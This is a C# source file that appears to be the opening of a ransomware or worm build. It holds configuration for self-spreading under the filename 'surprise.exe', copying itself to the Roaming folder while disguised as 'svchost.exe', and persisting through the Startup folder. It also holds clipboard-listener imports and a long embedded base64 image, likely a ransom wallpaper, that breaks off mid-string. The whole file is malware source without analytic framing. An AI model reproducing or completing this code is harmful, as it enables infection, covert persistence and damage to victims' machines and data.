using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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